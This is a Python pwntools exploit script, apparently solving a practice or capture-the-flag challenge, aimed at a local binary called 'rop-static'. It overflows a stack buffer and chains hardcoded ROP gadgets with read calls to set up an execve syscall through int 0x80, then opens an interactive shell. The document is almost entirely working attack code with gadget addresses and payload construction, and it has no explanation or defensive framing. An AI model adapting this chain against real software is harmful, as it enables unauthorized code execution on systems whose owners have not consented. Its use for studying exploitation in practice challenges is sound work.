#!/usr/bin/env python

from pwn import *


p = process("./rop-static")

print(p.recv())

buf = "A" * 0xd4

int_0x80 = p32(0x08048157)
FFF = p32(0x8048464) #for doing my file that runs the thing
read_write_addr = p32(0x8049800)
read_write_addr_8 = p32(0x8049808)

read = p32(0x08048170)

'''
0x08048106 : mov eax, dword ptr [ebp - 8] ; add esp, 8 ; pop ebp ; ret
0x0804810c : pop ebp ; ret
0x08048162 : pop ebx ; pop ebp ; ret
0x08048109 : add esp, 8 ; pop ebp ; ret
'''
mov_eax_ebp_8 = p32(0x08048106)
pop_ebp = p32(0x0804810c)
pop_ebx_ebp = p32(0x08048162)
add_esp_8_pop_ebp = p32(0x08048109)


#func, pop ret, args, pop ret, arg, repeat

#read(0, writable/readable addr, Number)
buf += read
buf += add_esp_8_pop_ebp
buf += p32(0)
buf += read_write_addr
buf += p32(4)




#read(-1, 0, 0)
buf += read
buf += add_esp_8_pop_ebp
buf += p32(69)
buf += p32(0)
buf += p32(0)




#eax = ebp -8, ebx = FFF
buf += pop_ebp
buf += read_write_addr_8
buf += mov_eax_ebp_8
buf += p32(0)
buf += p32(0)
buf += p32(0)
buf += pop_ebx_ebp
buf += FFF
buf += FFF





#int $0x80
buf += int_0x80


#print(p.recv())

p.sendline(buf)
raw_input()
p.send(p32(11))
p.interactive()
